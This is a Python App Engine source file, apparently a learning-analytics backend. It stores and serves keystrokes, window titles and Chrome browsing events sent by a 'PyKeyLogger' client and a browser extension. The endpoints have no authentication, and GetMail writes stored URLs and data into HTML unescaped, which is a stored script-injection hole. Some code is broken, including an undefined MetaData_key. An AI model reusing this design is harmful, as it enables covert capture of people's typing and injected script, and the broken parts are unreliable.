import cgi
import urllib

from google.appengine.api import users
from google.appengine.ext import ndb

import webapp2
import datetime
import jinja2
import os
import json
from openpyxl import load_workbook

# Setting up the Jinja environment to include html pages as templates
JINJA_ENVIRONMENT = jinja2.Environment(
    loader=jinja2.FileSystemLoader(os.path.dirname(__file__)),
    extensions=['jinja2.ext.autoescape'],
    autoescape=True)

## Define a key for chrome Entity
NAME = "chrome_data"
def browser_key(browser_name = NAME):
    return ndb.Key('Browser',browser_name)

## Define email, eventType, urlLink, data and timeStamp as properties of Chrome Entity.
class Chrome(ndb.Model):
    # Email id is a key
    email = ndb.StringProperty(indexed = True)
    eventType = ndb.StringProperty(indexed = False)
    urlLink = ndb.StringProperty(indexed = False)
    datas = ndb.StringProperty(indexed = False)
    timeStamp = ndb.StringProperty(indexed = False)

## Getting chrome data and storing in the database.
class ChromeData(webapp2.RequestHandler):
    def post(self):
        mail = self.request.get("email")
        event_type = self.request.get("eventType")
        url_link = self.request.get("urlLink")
        datass = self.request.get("datas")
        date = self.request.get("timeStamp")
        if mail is not None:
            browser = self.request.get('browser_name',NAME)
            data = Chrome(parent = browser_key(browser))
            data.email = mail
            data.eventType = event_type
            data.urlLink = url_link
            data.datas = datass
            data.timeStamp = date
            data.put()
        else:
            self.response.write('no')
        self.response.write('Success...')

# defining the key for PyKeyLogger entity
def pyKeyLogger_key(logger_name = "pyKey"):
    return ndb.Key('PyKey',logger_name)

## Define userName, loggeduser, windowtitle, datas and timeStamp as properties of
## PyKeyLogger Entity.
class PyKeyLogger(ndb.Model):
    userName = ndb.StringProperty(indexed = True)
    loggeduser = ndb.StringProperty(indexed = False)
    windowtitle = ndb.StringProperty(indexed = False)
    datas = ndb.StringProperty(indexed = False)
    timeStamp = ndb.StringProperty(indexed = False)

class KeyData(webapp2.RequestHandler):
    def post(self):   
        username = self.request.get("user")
        loggeUser = self.request.get("logged")
        title = self.request.get("title")
        datass = self.request.get("datas")
        date = self.request.get("start")
        if username is not None:
            keylogger = self.request.get('logger_name',"pyKey")
            data = PyKeyLogger(parent = pyKeyLogger_key(keylogger))
            data.userName = username
            data.loggeduser = loggeUser
            data.windowtitle = title
            data.datas = datass
            data.timeStamp = date
            data.put()
        else:
            self.response.write('no')
        self.response.write('Responding...')
#Metadata entity
class MetaData (ndb.Model):
    url = ndb.StringProperty(indexed = True)
    title = ndb.StringProperty(indexed = True)
    duration = ndb.StringProperty(indexed = False)
    typee = ndb.StringProperty(indexed = False)
    quiztype = ndb.StringProperty(indexed = False)
#Saving metadata into the database
class SaveMetaData(webapp2.RequestHandler):
    def post(self):
        url = self.request.get("url")
        title = self.request.get("title")
        duration = self.request.get("duration")
        typee = self.request.get("type")
        
        wb = load_workbook(filename='Lesson-1 Metadata.xlsx', read_only=True)
        ws = wb['Sheet1'] # ws is now an IterableWorksheet

        for row in ws.rows:
            list = []
            for cell in row:
                list.append(cell)
            if list[0] is not None:
                metaData = self.request.get('metadata',"meta")
                data = MetaData(parent = MetaData_key(metaData))
                data.url = list[0]
                data.title= list[1]
                data.duration = list[2]
                data.typee = list[3]
                data.quiztype = list[4]
                data.put()
            else:
                self.response.write('no')
        self.response.write('Success!!')
class MainPage(webapp2.RequestHandler):
    def get(self):
        #self.response.write('Hello world!')
        template_values = {}
        template = JINJA_ENVIRONMENT.get_template('home.html')
        self.response.write(template.render(template_values))

class getPyData(webapp2.RequestHandler):
    def post(self):
        username = self.request.get("user")
        pykeydata = self.request.get('logger_name',"pyKey")
        qry = PyKeyLogger.query(ancestor = pyKeyLogger_key(pykeydata))
        data_query = qry.filter(PyKeyLogger.userName == username)
        dataa = data_query.fetch()
        global result
        result = []
        for row in dataa:
            result.append(row)
        chrome_data= {}
        chrome_data['data'] = result
        self.response.write(result[0])

class getChrome(webapp2.RequestHandler):
    def get(self):
        template_values = {}
        template = JINJA_ENVIRONMENT.get_template('sample.html')
        self.response.write(template.render(template_values))

HTML = """\
<html>
  <body>
    <div>
        <table>
            <tr><th>TimeStamp</th><th>eventType</th><th>url</th><th>data</th></tr>
        
"""
class GetMail(webapp2.RequestHandler):
    def post(self):
        mail = self.request.get("email")
        chromedata = self.request.get('browser_name',"chrome_data")
        qry = Chrome.query(ancestor = browser_key(chromedata))
        data_query = qry.filter(Chrome.email == mail)
        dataa = data_query.fetch()
        global result
        result = []
        global HTML
        HTML = """\
        <html>
          <body border=\"1\" style=\"width:100%\">
            <div>
            <table>
            <tr><th>TimeStamp</th><th>eventType</th><th>url</th><th>data</th></tr>
        
        """
        for row in dataa:
            temp = {}
            temp['evenType'] = row.eventType
            temp['urlLink'] = row.urlLink
            temp['datas'] = row.datas
            temp['timeStamp'] = row.timeStamp
            temp['email'] = row.email
            result.append(temp)
            HTML = HTML+"<tr><td>"+row.timeStamp+"</td><td>"+row.eventType+"</td><td>"+row.urlLink+"</td><td>"+row.datas+"</td></tr>"
        HTML = HTML+"</table></div></body></html>"
        chrome_data= {'data':result}
        self.response.write(HTML)
        #self.response.write(mail)
class GetUsers(webapp2.RequestHandler):
    def post(self):
        chromedata = self.request.get('browser_name',"chrome_data")
        qry = Chrome.query(ancestor = browser_key(chromedata))
        #data_query = qry.filter(Chrome.email == mail)
        dataa = qry.fetch()
        global resu
        resu = []
        for row in dataa:
            if row.email not in resu and '@' in row.email:
                resu.append(row.email)
        user_list = {'users':resu}
        self.response.write(json.dumps(user_list))
app = webapp2.WSGIApplication([
    ('/', MainPage),
    ('/chrome',ChromeData),
    ('/keydata',KeyData),
    ('/getpydata',getPyData),
    ('/getchromedata',getChrome),
    ('/getMail',GetMail),
    ('/getusers',GetUsers),
], debug=True)
